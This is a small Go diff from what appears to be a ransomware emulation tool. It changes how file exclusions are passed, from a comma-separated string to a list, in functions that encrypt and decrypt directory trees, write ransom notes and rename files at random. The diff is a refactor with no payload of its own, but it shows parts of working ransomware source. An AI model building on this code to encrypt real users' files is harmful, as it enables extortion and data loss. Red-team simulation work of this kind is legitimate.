@@ -44,6 +44,7 @@ type YAML_CONFIG struct {
     Api_calls []string
     Command []string
     Filename []string
+    Exclude []string
     Drop_file struct {
         Path string
         Content string
@@ -171,7 +172,7 @@ func DisplayWebPage(url string) error {
 }
 
 func EncryptDirectoryStructure(
-	startdir string, aeskey [32]byte, exclude string,
+	startdir string, aeskey [32]byte, exclude []string,
 	newext string, ransom_note string, norename bool, dryrun bool) (int, int, int, error) {
 
 	if len(startdir) == 0 {
@@ -274,7 +275,7 @@ func DecryptDirectoryStructure(startdir string, ext string, norename bool, dryru
 
     dbh := ConnectDB(path.Join(startdir, HASHDB_FILE))
 	aesKey := fetchDecryptKey(startdir)
-	err := filepath.Walk(startdir, visitFilePath(&files, &skipped, ""))
+	err := filepath.Walk(startdir, visitFilePath(&files, &skipped, nil))
 	if err != nil {
 		return 0, 0, 0, err
 	}
@@ -378,7 +379,7 @@ func randomFileName(ext string) string {
 	return strings.Title(RandomWord()) + strings.Title(RandomWord()) + ext
 }
 
-func visitFilePath(files *[]string, skipcount *int, exclude string) filepath.WalkFunc {
+func visitFilePath(files *[]string, skipcount *int, exclude []string) filepath.WalkFunc {
 	return func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			log.Println(err)
@@ -502,7 +503,7 @@ func decryptData(cipherText []byte, key *[32]byte) ([]byte, error) {
 	return plainText, nil
 }
 
-func exclude_file(pathname string, exclude string) bool {
+func exclude_file(pathname string, exclude []string) bool {
 	if strings.Contains(pathname, RANSOM_NOTE_FILE) {
 		return true
 	} else if strings.Contains(pathname, RANSOM_KEY_FILE) {
@@ -516,7 +517,7 @@ func exclude_file(pathname string, exclude string) bool {
 	} else if len(exclude) == 0 {
 		return false
 	}
-	for _, e := range strings.Split(strings.ToLower(exclude), ",") {
+	for _, e := range exclude {
 		m, _ := path.Match("*"+strings.TrimSpace(e), pathname)
 		if m {
 			return true
